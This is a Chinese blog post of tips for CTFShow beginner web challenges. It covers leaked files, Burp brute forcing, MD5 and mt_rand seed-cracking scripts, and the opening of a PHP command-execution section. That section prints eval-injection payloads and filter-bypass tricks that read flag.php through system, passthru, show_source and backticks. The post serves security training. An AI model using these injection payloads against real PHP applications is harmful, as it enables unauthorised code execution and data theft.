<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTFSHOW WEB入门 Ttick总结, 会下雪的晴天">
    <meta name="description" content="The best way to know your strength is to fight">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>CTFSHOW WEB入门 Ttick总结 | 会下雪的晴天</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="会下雪的晴天" type="application/atom+xml">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>



   <style>
    body{
       background-image: url(https://raw.githubusercontent.com/yq1ng/blog/master/friedds/20211201133159.jpg);
       background-repeat:no-repeat;
       background-size:cover;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <span class="logo-span">会下雪的晴天</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <div class="logo-name">会下雪的晴天</div>
        <div class="logo-desc">
            
            The best way to know your strength is to fight
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/yq1ng" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/yq1ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    
<script src="/libs/cryptojs/crypto-js.min.js"></script>
<script>
    (function() {
        let pwd = '';
        if (pwd && pwd.length > 0) {
            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
                alert('密码错误，将返回主页！');
                location.href = '/';
            }
        }
    })();
</script>


<meta name="referrer" content="no-referrer" />



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTFSHOW WEB入门 Ttick总结</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/">
                                <span class="chip bg-color">...</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF%E5%88%B7%E9%A2%98/" class="post-category">
                                CTF刷题
                            </a>
                        
                            <a href="/categories/ctfshow/" class="post-category">
                                ctfshow
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2020-11-01
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2021-12-01
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    16.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    81 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><del>只记录一些tick，不是wp</del>随便写写</p>
<blockquote>
<p>PHP文档中使用的伪类型与变量</p>
<ul>
<li><code>mixed</code> –&gt; 说明一个参数可以接受多种不同的（但不一定是所有的）类型<br>例如 gettype() 可以接受所有的 PHP 类型，str_replace() 可以接受字符串和数组</li>
<li><code>number</code> –&gt; 说明一个参数可以是 integer 或者 float</li>
<li><code>array|object</code> –&gt; 意思是参数既可以是 array 也可以是 object</li>
<li><code>void</code> –&gt; 作为返回类型意味着函数的返回值是无用的。void 作为参数列表意味着函数不接受任何参数。从 PHP 7.1 开始 void 接受一个函数为返回类型</li>
<li><code>...</code> –&gt; 在函数原型中，<code>$...</code> 表示等等的意思。当一个函数可以接受任意个参数时使用此变量名</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>php文件泄露，访问<code>index.phps</code></p>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>常见文件备份参见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Lmg66/p/13598803.html">此博客</a></p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p>泄露重要(editor)的信息 直接在url后面添加/editor</p>
<h2 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h2><p>payload:<code>/tz.php</code> –&gt; 雅黑PHP探针<br>PHP探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p>
<h2 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h2><p>前台输入密码浏览器转码了，抓包重放</p>
<h2 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h2><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag</p>
<hr>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="web21"><a href="#web21" class="headerlink" title="web21"></a>web21</h2><p>bp爆破的custom iterator(自定义迭代器)应用<br>需要进行base64编码：payload processing 进行编码设置<br>取消Palyload Encoding编码 因为在进行base64加密的时候在最后可能存在 == 这样就会影响base64 加密的结果</p>
<h2 id="web23"><a href="#web23" class="headerlink" title="web23"></a>web23</h2><p>F1：bp爆破可以中奖</p>
<p>F2：写脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hashlib

dic <span class="token operator">=</span> <span class="token string">'0123456789qazwsxedcrfvtgbyhnujmikolp'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> md5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> md5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token keyword">and</span> md5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">==</span> md5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>结果是8，交上去不对，换两个字母的试试</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span>
<span class="token comment"># @Author: yq1ng</span>
<span class="token comment"># @Date:   2021-03-08 17:48:48</span>
<span class="token comment"># @Last Modified by:   yq1ng</span>
<span class="token comment"># @Last Modified time: 2021-03-08 18:02:57</span>
<span class="token keyword">import</span> hashlib

dic <span class="token operator">=</span> <span class="token string">'0123456789qazwsxedcrfvtgbyhnujmikolp'</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> dic<span class="token punctuation">:</span>
        md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> md5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token keyword">and</span> md5<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token operator">==</span> md5<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token operator">+</span>j<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>多个结果，发现3j才是答案</p>
<p>PHP版本</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/**
 * @Author: yq1ng
 * @Date:   2021-03-08 18:03:50
 * @Last Modified by:   yq1ng
 * @Last Modified time: 2021-03-08 18:06:32
 */</span>

<span class="token variable">$dic</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'0123456789qazwsxedcrfvtgbyhnujmikolp'</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span> <span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$token</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$dic</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dic</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">===</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
	            <span class="token keyword">echo</span> <span class="token variable">$dic</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$dic</span><span class="token punctuation">[</span><span class="token variable">$j</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	        <span class="token punctuation">}</span>
	    <span class="token punctuation">}</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="web24"><a href="#web24" class="headerlink" title="web24"></a>web24</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/**
 * @Author: yq1ng
 * @Date:   2021-03-08 18:09:43
 * @Last Modified by:   yq1ng
 * @Last Modified time: 2021-03-08 18:09:59
 */</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token number">372619038</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h2><p>还是伪随机数，先下载<a target="_blank" rel="noopener" href="https://github.com/lepiaf/php_mt_seed">php_mt_seed</a>工具</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token function">hexdec</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$rand</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$r</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$rand</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token variable">$rand</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'cat /proc/version'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>先传入r=0，得到一个随机数，再用工具求出种子，工具使用在github有详细说明，有个坑就是爆破时版本需要与环境一致，得到多个结果，逐个尝试</p>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154351.png" alt="image-20210318154351182"></p>
<p>我这里是第二个能用</p>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154231.png" alt="image-20210318154231557"></p>
<h2 id="web26"><a href="#web26" class="headerlink" title="web26"></a>web26</h2><p>走运了，直接安装啥都不写连接成功了，bp抓包可以看到flag</p>
<h2 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h2><p>下载学生名单，测试第一个学生，bp爆破生日，设置如下(unicode转中文下载插件<a target="_blank" rel="noopener" href="https://github.com/bit4woo/knife">knife</a>)，接着登陆即可</p>
<p><img src="https://raw.githubusercontent.com/yq1ng/blog/master/CTFShow/20210318154415.png" alt="image-20210318154415359"></p>
<h2 id="web28"><a href="#web28" class="headerlink" title="web28"></a>web28</h2><p>没啥说的，爆破目录，用最后一个爆破方式，两个均为0-100</p>
<hr>
<h1 id="命令执行（RCE）"><a href="#命令执行（RCE）" class="headerlink" title="命令执行（RCE）"></a>命令执行（RCE）</h1><h2 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h2><blockquote>
<p>eval用法：eval() 函数把字符串按照 PHP 代码来计算，且该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
</blockquote>
<p>这里仅提供一种做法，没啥过滤，随意发挥：<code>?c=system('tac f*');</code></p>
<h2 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h2><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h2><p><code>if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c))</code><br>过滤空格：<code>%09</code>、<code>${IFS}</code>、<code>$IFS$9</code>、<code>&lt;&gt;</code>、<code>&lt;</code><br>自己的payload：?c=echo(`tail%09f*`);<br>搜集的：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">show_source(next(array_reverse(scandir(pos(localeconv())))));

c=$a=show_source($_GET[1])?&gt;&amp;1=flag.php

c=eval($_GET[1])?&gt;&amp;1=system('cat flag.php');

c=?&gt;<span class="token php language-php"><span class="token delimiter important">&lt;?=</span>`<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>`<span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token comment">//查看源代码</span>
c<span class="token operator">=</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token number">1</span><span class="token operator">=</span>cat flag<span class="token punctuation">.</span>php<span class="token comment">//查看源代码</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
